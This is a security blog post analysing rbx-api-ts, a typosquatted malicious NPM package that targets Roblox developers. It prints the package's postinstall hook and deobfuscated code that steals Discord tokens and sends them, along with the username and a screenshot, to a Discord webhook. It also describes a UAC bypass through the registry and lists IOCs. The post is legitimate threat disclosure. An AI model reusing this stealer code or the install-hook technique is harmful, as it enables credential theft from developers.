---
title: The attack on Roblox developers is still ongoing
categories:
  - Security
tags:
  - Poison
date: 2024-12-26 22:00:00
---
## Summary
A malicious NPM package called rbx-api-ts is disguised with a name similar to [rbx-reader](https://github.com/littleBitsman/rbx-reader) to confuse users. Its purpose is to steal Discord tokens, install the Quasar RAT (a remote access tool), and disable or modify security software.
The malware also tampers with the Windows registry to activate itself whenever the user opens the Settings app.
![](/assets/2024-12-26/rbx-api-ts.jpg)
## Attack Path
![](/assets/2024-12-26/attack-pth.png)

## Code Analysis
Malicious code is triggered by executing the postinstall script in package.json during installation, Users only need to trigger the malicious code by installing it via npm install.
### package.json
```json
{
  "name": "rbx-api-ts",
  "version": "1.6.9",
  "description": "A NPM module for reading .rbxm(x) and .rbxl(x) files",
  "main": "dist/index.js",
  "types": "dist/index.d.ts",
  "repository": {
    "type": "git",
    "url": "git+https://github.com/littleBitsman/rbx-reader.git"
  },
  "author": "littleBitsman",
  "contributors": [
    {
      "name": "shiinazzz",
      "url": "https://www.npmjs.com/~shiinazzz"
    }
  ],
  "license": "AGPL-3.0-or-later",
  "bugs": {
    "url": "https://github.com/littleBitsman/rbx-reader/issues"
  },
  "homepage": "https://github.com/littleBitsman/rbx-reader#readme",
  "devDependencies": {
    "@types/jsdom": "^21.1.6",
    "typescript": "^5.3.3"
  },
  "dependencies": {
    "axios": "^1.7.8",
    "child_process": "^1.0.2",
    "crypto": "^1.0.1",
    "fs": "^0.0.1-security",
    "jsdom": "^25.0.1",
    "node-dpapi-prebuilt": "^1.0.4",
    "node-fetch": "^2.7.0",
    "os": "^0.1.2",
    "rbx-handler":"1.15.0"
  },
  "scripts": {
    "postinstall": "node postinstall"
  }
}
```
### postinstall.js
postinstall.js is obfuscated code.
![](/assets/2024-12-26/postinstall.jpg)
Use online deobfuscation for preliminary cleaning:
![](/assets/2024-12-26/deobfuscator.jpg)

### Core Code Simplification After Deobfuscation
```javascript
const os = require("os");  
const fs = require("fs");  
const path = require("path");  
const axios = require("axios");  
const { execSync } = require("child_process");  

const remoteURL = Buffer.from("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyMT...", "base64").toString('utf-8');  

function captureTokens(dir, tokens) {  
    const files = fs.readdirSync(dir);  
    for (const file of files) {  
        const filePath = path.join(dir, file);  
        if (fs.lstatSync(filePath).isDirectory()) {  
            captureTokens(filePath, tokens);  
        } else if (file.endsWith(".log") || file.endsWith(".ldb")) {  
            const content = fs.readFileSync(filePath, "utf8");  
            const regex = /dQw4w9WgXcQ:([^\"]+)/;  
            const match = content.match(regex);  
            if (match) {  
                const token = decryptToken(match[1]);  
                if (token) tokens.push(token);  
            }  
        }  
    }  
}  

function sendPayload(tokens, screenshotPath) {  
    const username = os.userInfo().username;  
    const embeds = tokens.map(token => ({  
        name: `Token: ${token}`,  
    }));  

    axios.post(remoteURL, {  
        username: `PC: ${username}`,  
        embeds: embeds,  
        file: fs.readFileSync(screenshotPath),  
    }).catch(console.error);  
}  

async function main() {  
    const tokens = [];  
    const screenshotPath = path.join(os.homedir(), "AppData", "screenshot.png");  

    await captureTokens("C:\\Users\\XYZ\\AppData\\Roaming\\Discord", tokens);  
    sendPayload(tokens, screenshotPath);  
}  

main();
```
### Malicious behavior
1. File Path and Environment Operations:
Specific paths are defined, such as the AppData directory, to determine the user environment through operating system information (os.userInfo, os.homedir, etc.). Random paths and filenames are dynamically generated for storing malicious files, such as downloading and executing cmd.exe or other executable files.

2. UAC Bypass and Registry Operations:
Registry keys and values are added and modified using the registry (HKCU\Software\Classes and ms-settings) to bypass User Account Control (UAC) by disguising as the ms-settings application. After completing the registry operations, specific commands are executed (such as launching designated programs or elevating privileges to run malicious code).

3. Intercepting and Decrypting Credentials (e.g., Discord Token):
Specific directories (such as Discord's leveldb storage) are traversed to find .log and .ldb files. The os_crypt and dpapi functions are used to decrypt data, extracting sensitive user information (such as the Discord Token). The correctness of the sensitive data is verified before sending it to a remote API.

4. Screenshot and File Upload:
Screenshots are taken using the screenshot module. The screenshot files and other data (such as credentials) are sent to a specified remote server using axios or fetch. The remote address is obfuscated through Base64 encoding to conceal the actual URL.

5. Reverse Call and Code Obfuscation Protection:
Various obfuscation and anti-tampering measures are included, such as using debugger detection to hinder analysis with meaningless code. Constructor functions (Function) are utilized to dynamically generate functions or execute code.

6. Malicious Execution and Feedback:
Malicious executable files are downloaded and executed (dynamically located via URL), and upon completion, a callback is made to notify the remote server of the execution status. Environmental information, including username, operating system, directories, etc., is stolen to record specific details about the attacked target.

## IOC
https[:]//discord.com/api/webhooks/1321618748800766065/xbYSb2el1e8huLuC2tX7J4_qSpAUEmIc_6o14R1eaf5EyrOlcFkYsPFWiumjxy4jh153

## Reference
1. https://www.virustotal.com/gui/url/cd2c8cbb84dd335d06abd542b9cceb6de20593de74e17c21e3302f795490c3cb/community
2. https://www.virustotal.com/gui/file/c316b0b818125541a90d7110af8c0908a8d6c73d3b846a27aed647fab6b38e00
2. https://checkmarx.com/blog/year-long-campaign-of-malicious-npm-packages-targeting-roblox-users/